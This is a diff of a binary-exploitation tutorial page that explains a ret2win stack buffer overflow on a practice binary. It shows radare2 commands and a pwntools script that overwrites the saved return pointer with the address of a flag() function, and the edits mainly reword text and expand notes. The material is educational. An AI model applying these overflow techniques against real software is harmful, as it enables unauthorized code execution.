@@ -10,16 +10,22 @@ To carry this out, we have to leverage what we learnt in the **introduction**, b
 
 To do this, what do we need to know? Well, a couple things:
 
-* The padding _until_ we begin to overwrite the EIP
+* The padding _until_ we begin to overwrite the return pointer \(EIP\)
 * What value we want to overwrite EIP to
+
+{% hint style="warning" %}
+When I say "overwrite EIP", I usually mean overwrite the saved return pointer that gets popped into EIP. The EIP register is not located on the stack, so it is not overwritten directly.
+{% endhint %}
 
 {% file src="../../.gitbook/assets/ret2win.zip" caption="ret2win" %}
 
 ### Finding the Padding
 
-This can be found using simple trial and error; if we send variable numbers of characters, we can use the `Segmentation Fault` message, in combination with radare2, to tell when we overwrote EIP. There is a better way to do it than simple brute force \(we'll cover this in the next post\), but it'll do for now.
+This can be found using simple trial and error; if we send a variable numbers of characters, we can use the `Segmentation Fault` message, in combination with radare2, to tell when we overwrote EIP. There is a better way to do it than simple brute force \(we'll cover this in the next post\), but it'll do for now.
 
-> Note: You may get a segmentation fault for reasons other than overwriting EIP; use a debugger to make sure the padding is correct.
+{% hint style="info" %}
+You may get a segmentation fault for reasons other than overwriting EIP; use a debugger to make sure the padding is correct.
+{% endhint %}
 
 We get an offset of 52 bytes.
 
@@ -35,7 +41,9 @@ $ afl
 [...]
 ```
 
-> Note: `afl` stands for **A**nalyse **F**unctions **L**ist
+{% hint style="info" %}
+`afl` stands for **A**nalyse **F**unctions **L**ist
+{% endhint %}
 
 The `flag()` function is at `0x080491c3`.
 
@@ -53,7 +61,7 @@ And that makes it much easier.
 
 ### Putting it Together
 
-Now we know the padding and the value, let's exploit the binary! We can use pwntools to interface with the binary \(check out the pwntools posts for a more in-depth look\).
+Now we know the padding and the value, let's exploit the binary! We can use [`pwntools`](https://github.com/Gallopsled/pwntools) to interface with the binary \(check out the [pwntools posts](../../other/pwntools/) for a more in-depth look\).
 
 ```python
 from pwn import *        # This is how we import pwntools
@@ -73,20 +81,20 @@ log.info(p.clean())      # Output the "Exploited!" string to know we succeeded
 If you run this, there is one small problem: it won't work. Why? Let's check with a debugger. We'll put in a `pause()` to give us time to attach `radare2` onto the process.
 
 ```python
-from pwn import *        # This is how we import pwntools
+from pwn import *
 
-p = process('./vuln')    # We're starting a new process
+p = process('./vuln')
 
 payload = 'A' * 52
 payload += '\x08\x04\x91\xc3'
 
-log.info(p.clean())      # Receive all the text
+log.info(p.clean())
 
-pause()
+pause()        # add this in
 
 p.sendline(payload)
 
-log.info(p.clean())      # Output the "Exploited!" string to know we succeeded
+log.info(p.clean())
 ```
 
 Now let's run the script with `python3 exploit.py` and then open up a new terminal window.
@@ -100,14 +108,16 @@ By providing the PID of the process, radare2 hooks onto it. Let's break at the r
 ```text
 [0x08049172]> db 0x080491aa
 [0x08049172]> dc
-<<press any button on the exploit terminal window>>
+
+<< press any button on the exploit terminal window >>
+
 hit breakpoint at: 80491aa
 [0x080491aa]> pxw @ esp
 0xffdb0f7c  0xc3910408 [...]
 [...]
 ```
 
-`0xc3910408` - look familiar? It's the address we were trying to send over, except the bytes have been reversed, and the reason for this reversal is [endianness](https://en.wikipedia.org/wiki/Endianness). Big-endian systems store the **most significant byte** \(the byte with the largest value\) at the smallest memory address, while little-endian does the opposite; most binaries you will come across are little-endian. Essentially, as far as we're concerned, the byte are stored in reverse order in little-endian executables.
+`0xc3910408` - look familiar? It's the address we were trying to send over, except the bytes have been reversed, and the reason for this reversal is [endianness](https://en.wikipedia.org/wiki/Endianness). Big-endian systems store the **most significant byte** \(the byte with the largest value\) at the smallest memory address, and this is how we sent them. Little-endian does the opposite \([for a reason](https://softwareengineering.stackexchange.com/questions/95556/what-is-the-advantage-of-little-endian-format)\), and most binaries you will come across are little-endian. As far as we're concerned, the byte are stored in _reverse order_ in little-endian executables.
 
 ### Finding the Endianness
 
